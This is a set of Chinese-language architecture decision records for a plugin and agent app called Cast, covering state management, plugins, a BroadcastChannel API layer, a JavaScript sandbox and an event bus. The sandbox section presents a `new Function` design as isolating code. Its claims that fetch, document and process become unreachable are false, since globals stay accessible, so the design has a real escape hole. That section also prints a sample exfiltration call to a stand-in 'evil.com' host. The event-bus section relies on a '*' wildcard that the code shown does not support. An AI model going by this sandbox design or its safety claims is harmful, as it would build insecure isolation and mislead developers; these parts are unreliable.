# Cast 架构决策记录 (ADRs)

> 本文档记录了 CodeCast Cast 系统在开发过程中的关键技术决策及其理由。
> 遵循 [Michael Nygard 的 ADR 格式](https://cognitect.com/blog/2011/11/15/documenting-architecture-decisions.html)。

---

## 目录

- [ADR-001: 为什么选择 Zustand 而非 Redux/Context](#adr-001-为什么选择-zustand-而非-reduxcontext)
- [ADR-002: 为什么插件系统使用接口而非类继承](#adr-002-为什么插件系统使用接口而非类继承)
- [ADR-003: API Server 为何使用 BroadcastChannel 而非真实 HTTP](#adr-003-api-server-为何使用-broadcastchannel-而非真实-http)
- [ADR-004: 沙箱安全模型选择](#adr-004-沙箱安全模型选择)
- [ADR-005: 事件驱动架构设计](#adr-005-事件驱动架构设计)

---

## ADR-001: 为什么选择 Zustand 而非 Redux/Context

**状态**: ✅ 已采纳

**背景**

Cast 系统需要管理多个复杂状态：
- 工具注册表（CastToolRegistry）
- 插件生命周期
- Agent 会话状态
- 内存/记忆系统
- 调度器任务
- 沙箱执行环境
- 设置和配置

项目已有 `useScheduleStore`、`useKnowledgeStore`、`useMemoryStore` 等 Zustand Store。

**决策**

使用 **Zustand (with devtools)** 作为所有 Cast Store 的状态管理方案。

```typescript
// 示例：useCastAgentStore
import { create } from 'zustand';
import { devtools } from 'zustand/middleware';

interface CastAgentState {
  agents: Map<string, AgentConfig>;
  activeSession: string | null;

  addAgent: (agent: AgentConfig) => void;
  removeAgent: (id: string) => void;
  setActiveSession: (sessionId: string) => void;
}

export const useCastAgentStore = create<CastAgentState>()(
  devtools(
    (set) => ({
      agents: new Map(),
      activeSession: null,

      addAgent: (agent) =>
        set((state) => {
          const agents = new Map(state.agents);
          agents.set(agent.id, agent);
          return { agents };
        }),

      removeAgent: (id) =>
        set((state) => {
          const agents = new Map(state.agents);
          agents.delete(id);
          return { agents };
        }),

      setActiveSession: (sessionId) => set({ activeSession: sessionId }),
    }),
    { name: 'cast-agent-store' }
  )
);
```

**理由**

| 维度 | Zustand | Redux Toolkit | Context API |
|------|---------|---------------|-------------|
| **代码量** | ~70% of Redux | 基准线 | 最少但扩展性差 |
| **DevTools** | 内置支持 | 需要 redux-devtools | 无原生支持 |
| **TypeScript** | 完美支持 | 良好 | 一般 |
| **学习曲线** | 低 | 中等 | 低 |
| **性能** | 优秀（选择性订阅） | 优秀 | 差（全量重渲染） |
| **Boilerplate** | 极少 | 较多 | 少 |
| **中间件** | 丰富生态 | 丰富 | 有限 |

**关键优势**

1. **一致性**: 与项目现有 Store 保持统一的技术栈
2. **简洁性**: 无需 Action/Reducer/Slice 分离，单文件即可定义完整 Store
3. **性能**: 内置 `shallow` 比较和选择性订阅，避免不必要的重渲染
4. **DevTools**: 开箱即用的调试体验
5. **灵活性**: 支持在组件外访问/修改状态（对插件系统至关重要）

**替代方案考虑**

- **Redux Toolkit**: 功能强大但 Boilerplate 过多，对于 Cast 系统的规模来说过重
- **Jotai**: 原子化状态管理，适合细粒度场景，但对于复杂的聚合状态不够直观
- **Recoil**: 类似 Jotai，但维护状态不稳定
- **Context API**: 对于频繁更新的全局状态会导致严重的性能问题

**后果**

- ✅ 团队学习成本低，与现有代码风格一致
- ✅ 易于测试（纯函数式更新）
- ⚠️ 需要团队遵循 Zustand 最佳实践（避免过度嵌套）
- ⚠️ 大型 Store 可能需要拆分为多个子 Store

---

## ADR-002: 为什么插件系统使用接口而非类继承

**状态**: ✅ 已采纳

**背景**

Cast 插件系统需要：
- 定义标准化的工具接口
- 支持运行时动态加载/卸载
- 允许第三方开发者轻松扩展
- 保证类型安全

**决策**

ICastTool 使用 **interface + 组合模式** 定义，通过组合而非继承扩展功能。

```typescript
// 接口定义 - 轻量级契约
interface ICastTool {
  id: string;
  name: string;
  description: string;
  execute(params, context): Promise<ToolResult>;
  // ... 可选字段
}

// 实现 - 简洁的对象字面量
const myTool: ICastTool = {
  id: 'my_tool',
  name: '我的工具',
  async execute(params, context) {
    return { success: true, output: 'Done' };
  }
};

// 扩展 - 通过 metadata 或装饰器，而非继承
const extendedTool: ICastTool = {
  ...baseTool,
  metadata: { ...baseTool.metadata, feature: 'new' }
};
```

**理由**

### 1. Composition over Inheritance（组合优于继承）

```
❌ 继承方式的问题:
┌─────────────┐
│ BaseTool     │ ← 基类变更影响所有子类
├─────────────┤
│ +execute()  │
│ +validate() │
│ +init()     │
└──────┬──────┘
       │
   ┌───┴──────┬──────────┐
   ▼          ▼          ▼
WeatherTool  JsonTool   UnitTool
(重写所有)  (重写部分)  (全部默认)


✅ 组合方式:
┌─────────────┐     ┌─────────────┐
│ ICastTool    │◄────│ WeatherTool │ (独立对象)
│ (interface) │     │ +weather逻辑│
└─────────────┘     └─────────────┘
                          │
                          │ implements
                          ▼
                   ┌─────────────┐
                   │ ToolRegistry │ (外部服务)
                   │ +register()  │
                   │ +validate()  │
                   └─────────────┘
```

### 2. JavaScript/TS 生态最佳实践

- Go 语言的成功证明了 struct + interface 的优越性
- React Hooks 也是从 class 组件转向函数式 + hooks
- 现代 TS 库（tRPC、Zod）都倾向组合模式

### 3. 运行时优势

| 特性 | Class 继承 | Interface 组合 |
|------|-----------|----------------|
| 序列化 | ❌ 需要特殊处理 | ✅ 天然可序列化 |
| 动态修改 | ❌ 需要 Proxy hack | ✅ 直接展开运算符 |
| 类型检查 | 运行时 instanceof | 编译时 type guard |
| 测试 | 需要 mock 类 | 纯数据，易于构造 |
| 跨上下文 | ❌ 可能丢失 prototype | ✅ 结构化克隆友好 |

### 4. 版本兼容性

```typescript
// 新增字段不会破坏旧插件
interface ICastToolV2 extends ICastTool {
  streaming?: boolean;  // 可选字段
  permissions?: Permission[];
}

// 旧插件仍然有效（鸭子类型）
const oldPlugin: ICastTool = { /* v1 字段 */ };
const registry = new CastToolRegistry();
registry.register(oldPlugin);  // ✅ 正常工作
```

**替代方案考虑**

- **Abstract Class + Inherit**:
  - 优点：可以提供默认实现
  - 缺点：紧耦合、难以跨版本兼容、序列化困难
- **Function-based (like Express middleware)**:
  - 优点：极简
  - 缺点：缺乏结构化元数据、IDE 支持弱
- **Decorator-based (like Angular)**:
  - 优点：声明式、元编程能力
  - 缺点：实验性特性、调试困难、编译依赖重

**后果**

- ✅ 插件开发者只需了解 interface 即可开始开发
- ✅ 运行时动态加载/热更新更简单
- ✅ 更容易做 schema 校验和文档生成
- ⚠️ 无法利用 class 的封装性（但通过模块作用域弥补）
- ⚠️ 共享逻辑需要提取为 utility 函数

---

## ADR-003: API Server 为何使用 BroadcastChannel 而非真实 HTTP

**状态**: ✅ 已采纳（临时方案）

**背景**

Phase 3.2 要求实现 API Server 层，用于：
- 统一 Memory/Scheduler/Agent 等模块的访问接口
- 为未来后端集成预留抽象层
- 支持 Postman 等工具进行 API 测试

**技术约束**

- Wails 应用无独立的 Node.js 后端进程
- Go 后端可能未暴露 HTTP 端口（或端口不确定）
- 前端运行在浏览器/WebView 环境中
- 需要零额外依赖的解决方案

**决策**

Phase 3.2 的 API Server 使用 **BroadcastChannel API** 作为传输层，模拟 RESTful API 行为。

```typescript
// cast-api-server.ts 核心实现
class CastApiServer {
  private channel: BroadcastChannel;

  constructor() {
    this.channel = new BroadcastChannel('cast-api');
    this.channel.onmessage = this.handleRequest.bind(this);
  }

  // 模拟 GET /api/v1/memory
  async handleGetMemory(request: ApiRequest): Promise<ApiResponse> {
    const memories = memoryStore.getState().getAll();
    return { status: 200, data: memories };
  }

  // 统一请求处理
  private async handleRequest(event: MessageEvent) {
    const { method, path, body, requestId } = event.data;
    let response: ApiResponse;

    try {
      switch (`${method} ${path}`) {
        case 'GET /api/v1/memory':
          response = await this.handleGetMemory(event.data);
          break;
        case 'POST /api/v1/memory':
          response = await this.handlePostMemory(event.data);
          break;
        // ... 更多路由
        default:
          response = { status: 404, error: 'Not Found' };
      }
    } catch (error) {
      response = { status: 500, error: error.message };
    }

    // 返回响应
    this.channel.postMessage({ requestId, ...response });
  }
}
```

**理由**

### 1. 技术可行性对比

| 方案 | 依赖 | 复杂度 | Wails 兼容 | 可迁移性 |
|------|------|--------|-----------|---------|
| **BroadcastChannel** | ✅ 零依赖 | 🟢 低 | ✅ 原生支持 | 🟡 需替换 transport |
| Node.js HTTP Server | ❌ 需要 Node | 🔴 高 | ❌ 不可用 | ✅ 生产级 |
| fetch() mock | ✅ 零依赖 | 🟡 中 | ⚠️ 有限制 | 🔴 需重写 |
| Service Worker | ✅ 浏览器API | 🟡 中 | ⚠️ WebView限制 | 🔴 场景不同 |

### 2. BroadcastChannel 优势

```typescript
// ✅ 浏览器原生 API，无需 polyfill
const channel = new BroadcastChannel('cast-api');

// ✅ 同源下所有 tab/window 共享
// ✅ 支持 structured clone（可传递复杂对象）
// ✅ 异步消息队列，不阻塞主线程
// ✅ 事件驱动，符合现有架构

// 使用示例
channel.postMessage({
  type: 'request',
  method: 'GET',
  path: '/api/v1/memory',
  requestId: crypto.randomUUID()
});
```

### 3. 架构隔离 - Transport Layer 模式

```
┌─────────────────────────────────────────────┐
│              Client Layer                    │
│  castApiClient (TypeScript SDK)              │
│  - getTypeScript()                           │
│  - postMemory(data)                          │
└──────────────────┬──────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────┐
│           Transport Layer (可替换)            │
│                                             │
│  Phase 3.x:  BroadcastChannelTransport       │
│  Phase 4.x:  HttpTransport (Go Backend)      │
│  Phase 5.x:  WebSocketTransport (实时通信)    │
│                                             │
└──────────────────┬──────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────┐
│            Server Core                       │
│  Router → Handler → Service → Store         │
└─────────────────────────────────────────────┘
```

**迁移路径**

当 Go 后端就绪时，只需替换 Transport Layer：

```typescript
// 当前实现
import { BroadcastChannelTransport } from './transports/broadcast';

// 未来迁移
import { HttpTransport } from './transports/http';

// Server 初始化不变
const server = new CastApiServer({
  transport: isProduction ? new HttpTransport(baseUrl) : new BroadcastChannelTransport()
});
```

**替代方案考虑**

- **直接调用 Store 函数**:
  - 优点：最简单
  - 缺点：无法统一拦截、日志、权限控制；不利于未来迁移
- **Mock Service Worker (MSW)**:
  - 优点：标准的 API mock 方案
  - 缺点：主要用于测试，不适合作为生产临时方案
- **iframe + postMessage**:
  - 优点：完全隔离
  - 缺点：性能开销大、复杂度高

**后果**

- ✅ 零依赖启动，不增加 bundle size
- ✅ 完整模拟 RESTful 语义，客户端代码可直接复用
- ✅ Postman Collection 可以提前准备和验证
- ⚠️ 仅限同源页面间通信（但对单页应用足够）
- ⚠️ 不支持跨域请求（未来 HTTP 方案会解决）
- ⚠️ 需要在文档中明确标注"开发阶段实现"

---

## ADR-004: 沙箱安全模型选择

**状态**: ✅ 已采纳

**背景**

Cast Sandbox 需要执行用户提供的或第三方插件代码：
- 代码格式化工具
- 自定义脚本执行
- 动态表达式求值
- AI 生成的代码片段

**核心需求**
1. **隔离性**: 恶意代码不能访问宿主环境
2. **可控性**: 可精确限制可用 API
3. **性能**: 不能显著影响主线程
4. **可观测性**: 能捕获输出和错误

**决策**

使用 **Function 构造器 + 受限全局上下文** 作为 JS 沙箱方案。

```typescript
class CastSandbox {
  private timeout: number = 5000;
  private maxOutputSize: number = 1024 * 1024; // 1MB

  async execute(code: string, context: SandboxContext): Promise<SandboxResult> {
    // 1. 创建受限的全局上下文
    const sandboxGlobals = this.createSandboxGlobals(context);

    // 2. 使用 Function 构造器创建隔离函数
    const fn = new Function(
      ...Object.keys(sandboxGlobals),
      `
        "use strict";
        ${code}
      `
    );

    // 3. 包装超时和输出截断
    return await this.withTimeout(async () => {
      const result = fn(...Object.values(sandboxGlobals));
      const output = String(result);

      if (output.length > this.maxOutputSize) {
        throw new Error(`Output exceeds maximum size (${this.maxOutputSize} bytes)`);
      }

      return { success: true, output };
    }, this.timeout);
  }

  private createSandboxGlobals(context: SandboxContext): Record<string, unknown> {
    return {
      // 只暴露安全的 API
      console: {
        log: (...args: unknown[]) => context.onOutput?.('log', args),
        error: (...args: unknown[]) => context.onOutput?.('error', args),
        warn: (...args: unknown[]) => context.onOutput?.('warn', args),
      },
      JSON: { parse: JSON.parse, stringify: JSON.stringify },
      Math: Math,
      Date: Date,
      parseInt: parseInt,
      parseFloat: parseFloat,
      isNaN: isNaN,
      isFinite: isFinite,
      encodeURI: encodeURI,
      decodeURI: decodeURI,
      encodeURIComponent: encodeURIComponent,
      decodeURIComponent: decodeURIComponent,

      // 明确禁止的（通过不提供来实现）
      // - window, document, fetch, XMLHttpRequest
      // - require, import, eval
      // - process, global, globalThis
      // - setTimeout, setInterval (由沙箱控制)
    };
  }

  private async withTimeout<T>(
    fn: () => Promise<T>,
    ms: number
  ): Promise<T> {
    return Promise.race([
      fn(),
      new Promise<never>((_, reject) =>
        setTimeout(() => reject(new Error('Execution timeout')), ms)
      )
    ]);
  }
}
```

**理由**

### 方案对比矩阵

| 方案 | 安全性 | 性能 | 复杂度 | 调试体验 | 浏览器兼容 |
|------|--------|------|--------|----------|-----------|
| **Function + Restricted Globals** | 🟡 中 | 🟢 高 | 🟢 低 | 🟢 优 | ✅ 全支持 |
| iframe sandbox | 🟢 高 | 🔴 低 | 🔴 高 | 🟡 中 | ✅ 全支持 |
| Web Worker | 🟢 高 | 🟢 高 | 🟡 中 | 🟡 中 | ✅ 全支持 |
| WASM (QuickJS) | 🟢 高 | 🟢 高 | 🔴 高 | 🔴 差 | 🟡 部分支持 |
| vm module (Node.js) | 🟢 高 | 🟢 高 | 🟡 中 | 🟢 优 | ❌ 不可用 |

### 选择 Function 构造器的关键原因

#### 1. 性能优势

```javascript
// Function 构造器: ~0.1ms 启动开销
const fn = new Function('return 1 + 1');
fn(); // 直接执行

// iframe: ~50-100ms 创建开销
const iframe = document.createElement('iframe');
iframe.sandbox = 'allow-scripts';
document.body.appendChild(iframe);
await new Promise(r => iframe.onload = r);
const fn = iframe.contentWindow.eval('() => 1 + 1'); // 需要序列化通信
```

对于需要频繁执行的轻量级操作（如代码格式化），Function 构造器的性能优势明显。

#### 2. API 精确控制

```typescript
// ✅ 白名单模式 - 只允许明确声明的 API
const allowedApis = ['console', 'JSON', 'Math'];

// 用户代码尝试访问:
fetch('https://evil.com/steal')  // → ReferenceError: fetch is not defined
document.cookie                  // → ReferenceError: document is not defined
process.env.SECRET               // → ReferenceError: process is not defined
```

#### 3. 输出捕获简单

```typescript
// 直接获取返回值
const result = fn();  // 同步返回

// vs iframe 需要通过 postMessage 通信
iframe.contentWindow.postMessage({ type: 'execute', code });
iframe.addEventListener('message', (e) => {
  // 异步接收结果...
});
```

### 安全措施

虽然 Function 构造器不是最安全的方案，但我们通过多层防护降低风险：

```
Layer 1: API 白名单（只暴露安全的全局对象）
    ↓
Layer 2: 超时机制（防止无限循环）
    ↓
Layer 3: 输出截断（防止内存耗尽攻击）
    ↓
Layer 4: 内容扫描（检测危险模式，可选）
    ↓
Layer 5: 权限声明（用户确认后才执行）
```

**已知风险与缓解**

| 风险 | 严重程度 | 缓解措施 |
|------|----------|----------|
| 可访问部分内置原型 | 🟡 中 | 冻结敏感对象（Object.freeze） |
| 内存泄漏（闭包） | 🟡 中 | 限制执行时间+输出大小 |
| 原型链污染 | 🔴 高 | 扫描 `__proto__`、`constructor`、`prototype` |
| ReDoS 正则攻击 | 🟡 中 | 超时机制覆盖 |

**替代方案考虑**

- **iframe + sandbox="allow-scripts"**:
  - 最安全的浏览器原生方案
  - 但性能开销大（~100ms/次）、通信复杂
  - 适用于高安全要求的场景（如执行不可信的第三方代码）

- **Web Worker**:
  - 真正的线程隔离
  - 但不能操作 DOM（某些场景需要）
  - 通信仍需序列化

- **WASM + QuickJS**:
  - 接近原生性能和安全隔离
  - 但 bundle size 大（~1MB）、编译时间长
  - 适合生产环境的最终方案

**后果**

- ✅ 快速启动，用户体验好
- ✅ 代码简洁，易于维护和理解
- ✅ 对 95% 的使用场景足够安全
- ⚠️ 不适合执行高度敏感的不可信代码（需用 iframe 替代）
- ⚠️ 需要在文档中明确安全边界
- 📋 未来升级路径：当安全性要求提高时，可切换到 iframe 或 WASM 方案

---

## ADR-005: 事件驱动架构设计

**状态**: ✅ 已采纳

**背景**

Cast 系统包含多个松耦合模块：
- Agent Engine（智能体引擎）
- Memory System（记忆系统）
- Scheduler（调度器）
- Plugin Manager（插件管理器）
- Tools Registry（工具注册表）
- Settings Store（设置存储）

这些模块之间存在复杂的交互需求：
- 工具执行完成后通知 Agent
- 记忆更新后触发推荐算法
- 任务调度到期时唤醒相关服务
- 插件加载/卸载时刷新 UI

**决策**

采用 **发布-订阅事件总线（EventBus）** 作为模块间通信的核心机制。

```typescript
// 事件总线实现
type EventCallback<T = unknown> = (data: T) => void;

class CastEventBus {
  private listeners = new Map<string, Set<EventCallback>>();

  on<T>(event: string, callback: EventCallback<T>): () => void {
    if (!this.listeners.has(event)) {
      this.listeners.set(event, new Set());
    }
    this.listeners.get(event)!.add(callback);

    // 返回取消订阅函数
    return () => this.off(event, callback);
  }

  off<T>(event: string, callback: EventCallback<T>): void {
    this.listeners.get(event)?.delete(callback);
  }

  emit<T>(event: string, data?: T): void {
    const callbacks = this.listeners.get(event);
    if (callbacks) {
      callbacks.forEach(cb => {
        try {
          cb(data);
        } catch (error) {
          console.error(`[EventBus] Error in handler for "${event}":`, error);
        }
      });
    }
  }

  once<T>(event: string, callback: EventCallback<T>): () => void {
    const wrapper: EventCallback<T> = (data) => {
      callback(data);
      this.off(event, wrapper);
    };
    return this.on(event, wrapper);
  }
}

// 全局单例
export const castEventBus = new CastEventBus();
```

**事件命名规范**

```
{module}:{action}:{detail}

示例:
tool:registered          → 工具被注册
tool:unregistered        → 工具被注销
tool:execution:start     → 工具开始执行
tool:execution:complete  → 工具执行完成
tool:execution:error     → 工具执行出错

plugin:loaded            → 插件加载完成
plugin:unloaded          → 插件卸载完成
plugin:error             → 插件出错

memory:added             → 记忆添加
memory:updated           → 记忆更新
memory:deleted           → 记忆删除

scheduler:job:created    → 任务创建
scheduler:job:triggered  → 任务触发
scheduler:job:completed  → 任务完成

agent:message:sent       → Agent 发送消息
agent:message:received   → Agent 收到消息
agent:session:started    → 会话开始
agent:session:ended      → 会话结束
```

**使用示例**

```typescript
// 模块A: 工具注册表
class CastToolRegistry {
  register(tool: ICastTool): boolean {
    // ... 注册逻辑

    // 发布事件
    castEventBus.emit('tool:registered', { tool, timestamp: Date.now() });

    return true;
  }
}

// 模块B: UI 面板（监听工具变化）
function MarketplacePanel() {
  useEffect(() => {
    const unsubscribe = castEventBus.on<{ tool: ICastTool }>(
      'tool:registered',
      ({ tool }) => {
        showToast(`新工具已安装: ${tool.name}`);
        refreshToolsList();
      }
    );

    return unsubscribe; // 清理副作用
  }, []);
}

// 模块C: 日志系统（记录所有事件）
class AuditLogger {
  start() {
    castEventBus.on('*', (event, data) => {
      this.log({ event, data, timestamp: Date.now() });
    });
  }
}
```

**理由**

### 1. 解耦的直接收益

```
❌ 紧耦合（直接引用）:

ToolRegistry ──imports──► UI Panel
    │                      ▲
    ├──imports──► Agent Engine
    │                      │
    └──imports──► Logger   │
         ↖︎ 循环依赖 ↙︎━━━━┛


✅ 松耦合（事件驱动）:

┌─────────────┐    emit    ┌──────────────┐
│ ToolRegistry │ ────────► │   EventBus    │
└─────────────┘            └──────┬───────┘
                                   │
                    ┌──────────────┼──────────────┐
                    ▼              ▼              ▼
            ┌─────────────┐ ┌───────────┐ ┌─────────────┐
            │  UI Panel   │ │Agent Eng. │ │Audit Logger │
            │  (subscribe)│ │(subscribe)│ │ (subscribe) │
            └─────────────┘ └───────────┘ └─────────────┘
```

### 2. 符合 SOLID 原则

- **单一职责 (SRP)**: 每个模块只关注自己的业务逻辑
- **开闭原则 (OCP)**: 新增消费者只需新增订阅者，不需修改发布者
- **依赖倒置 (DIP)**: 模块依赖于抽象（事件接口），不依赖具体实现
- **里氏替换 (LSP)**: 任何订阅者都可以处理相同的事件格式

### 3. 可扩展性

```typescript
// 新增功能：统计分析
class AnalyticsCollector {
  constructor() {
    castEventBus.on('tool:execution:complete', (data) => {
      trackMetric('tool_execution_time', data.duration);
      trackMetric('tool_success_rate', data.success ? 1 : 0);
    });
  }
}

// 新增功能：自动持久化
class AutoPersister {
  constructor() {
    castEventBus.on('memory:updated', ({ memory }) => {
      db.save(memory);
    });
  }
}

// 这些新功能不需要修改任何现有代码！
```

### 4. 可测试性

```typescript
// 单元测试：验证事件发布
it('should emit event when tool is registered', () => {
  const listener = jest.fn();
  const unsubscribe = castEventBus.on('tool:registered', listener);

  registry.register(testTool);

  expect(listener).toHaveBeenCalledWith(
    expect.objectContaining({ tool: testTool })
  );

  unsubscribe();
});

// 集成测试：验证完整流程
it('should update UI when plugin is loaded', async () => {
  const renderSpy = jest.fn();
  castEventBus.on('plugin:loaded', renderSpy);

  await pluginLoader.loadFromLocal('/path/to/plugin');

  expect(renderSpy).toHaveBeenCalled();
});
```

**替代方案考虑**

- **回调函数（Callbacks）**:
  - 优点：简单直接
  - 缺点：难以管理多个观察者；容易导致回调地狱；耦合度高

- **Promise 链**:
  - 优点：异步流程清晰
  - 缺点：只能 resolve/reject 一次；不支持多消费者；不是为广播设计的

- **Observable (RxJS)**:
  - 优点：强大的操作符（map/filter/debounce 等）；支持取消
  - 缺点：学习曲线陡峭；bundle size 较大（~15KB gzipped）；对于当前场景过于重量级
  - *注：如果未来需要复杂的事件流处理，可以考虑引入*

- **直接函数调用（共享实例）**:
  - 优点：类型安全；IDE 支持好
  - 缺点：循环依赖风险；紧耦合；难以扩展

**后果**

- ✅ 模块间解耦，各自独立开发和测试
- ✅ 易于添加新的功能（如监控、分析、缓存）而不影响现有代码
- ✅ 符合观察者模式和发布-订阅模式的最佳实践
- ⚠️ 事件流可能变得难以追踪（需配合 DevTools 和文档缓解）
- ⚠️ 需要建立严格的事件命名和数据格式规范
- ⚠️ 错误处理需要在每个 handler 内部完成（或使用统一的 wrapper）

**最佳实践建议**

1. **事件文档化**: 在代码注释中记录每个事件的 payload 格式
2. **类型安全**: 为每个事件定义 TypeScript 接口
3. **避免事件风暴**: 合理使用 debounce/throttle
4. **内存泄漏防范**: 确保 useEffect 中正确清理订阅
5. **事件版本化**: 如需变更 payload 格式，使用 version 字段

---

## 附录：决策状态图

```
时间线 →

Phase 1 (基础)          Phase 2 (扩展)           Phase 3 (完善)
─────────────────►     ─────────────────────►    ─────────────────────►

┌─────────────────┐   ┌─────────────────────┐   ┌───────────────────────┐
│ ADR-001: Zustand│   │ ADR-002: Interface  │   │ ADR-003: BroadcastCh │
│ (状态管理)       │   │ (插件系统)          │   │ (API Server)          │
│                 │   │                     │   │                       │
│ ✅ 已采纳       │   │ ✅ 已采纳           │   │ ✅ 已采纳 (临时方案)  │
│ 🔄 稳定运行     │   │ 🔄 稳定运行         │   │ 🔄 待迁移到 HTTP     │
└─────────────────┘   └─────────────────────┘   └───────────────────────┘

                        ┌─────────────────────┐   ┌───────────────────────┐
                        │ ADR-004: Sandbox    │   │ ADR-005: EventBus     │
                        │ (安全模型)          │   │ (事件驱动)            │
                        │                     │   │                       │
                        │ ✅ 已采纳           │   │ ✅ 已采纳             │
                        │ 🔄 监控中           │   │ 🔄 稳定运行           │
                        └─────────────────────┘   └───────────────────────┘
```

---

## 文档信息

| 项目 | 值 |
|------|-----|
| **版本** | 1.0.0 |
| **最后更新** | 2025-01 |
| **维护者** | CodeCast Architecture Team |
| **审核周期** | 每季度 |
| **相关文档** | [插件开发指南](./cast-plugin-dev-guide.md)、[Postman 集合](./cast-api-postman-collection.json) |

---

**如何添加新的 ADR**

1. 复制此模板并填写以下字段：
   - 标题（描述决策内容）
   - 状态（提议/已采纳/已废弃/已替代）
   - 背景（问题上下文）
   - 决策（做了什么选择）
   - 理由（为什么这样选择）
   - 后果（好的和坏的影响）

2. 使用 PR 提交，经过团队 review 后合并
3. 在目录和状态图中更新索引
